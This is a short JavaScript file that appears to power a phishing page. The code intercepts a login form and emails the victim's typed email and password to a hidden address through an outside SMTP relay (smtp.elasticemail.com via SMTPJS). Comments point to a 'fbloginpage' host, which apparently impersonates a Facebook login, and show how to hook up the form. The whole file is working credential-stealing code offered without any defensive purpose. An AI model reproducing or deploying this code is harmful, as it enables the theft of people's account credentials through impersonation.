
function submitLoginForm(event){
    event.preventDefault();
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "***************",
        Password : "***************",
        To : '***************',
        From : "***************",
        Subject : event.target['email'].value,
        Body : event.target['password'].value
    });
}

// a href="https://fbloginpage.pythonanywhere.com/"
// form onsubmit="submitLoginForm(event)"
// <script src="https://smtpjs.com/v3/smtp.js"></script><script src="email.js" type="text/javascript"></script>
